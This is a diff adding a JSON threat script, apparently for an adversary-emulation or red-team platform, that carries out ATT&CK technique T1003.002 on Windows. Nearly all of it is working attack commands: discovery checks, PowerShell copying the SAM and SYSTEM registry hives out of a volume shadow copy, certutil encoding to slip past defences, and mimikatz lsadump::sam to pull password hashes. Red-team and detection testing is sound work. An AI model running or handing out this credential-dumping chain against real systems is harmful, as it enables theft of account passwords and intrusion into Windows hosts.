@@ -1,0 +1,115 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Dump SAM on Windows systems with incorrect permissions.",
+        "display_name": "T1003_002-SAMDump",
+        "name": "T1003_002-SAMDump",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami /groups",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "sc query vss",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "vssadmin list shadows",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "icacls %windir%\\system32\\config\\sam",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell foreach($i in @(\"SYSTEM\",\"SAM\")){[System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\$i\", \"$i\")}",
+                "rtags": [
+                    "att&ck-technique:T1003.002"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "certutil -encode \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\SYSTEM SYSTEM.encoded",
+                "rtags": [
+                    "att&ck-technique:T1003.002"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "certutil -decode SYSTEM.encoded SYSTEM.hive",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "certutil -encode \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\SAM SAM.encoded",
+                "rtags": [
+                    "att&ck-technique:T1003.002"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "certutil -decode SAM.encoded SAM.hive ",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "12": {
+                "function": "ifelse",
+                "next": "15",
+                "step": "11",
+                "type": "decision",
+                "value": "high",
+                "verb": "does not contain"
+            },
+            "13": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist \"lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\system /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\\\sam\"",
+                "rtags": [
+                    "att&ck-technique:T1003.002"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
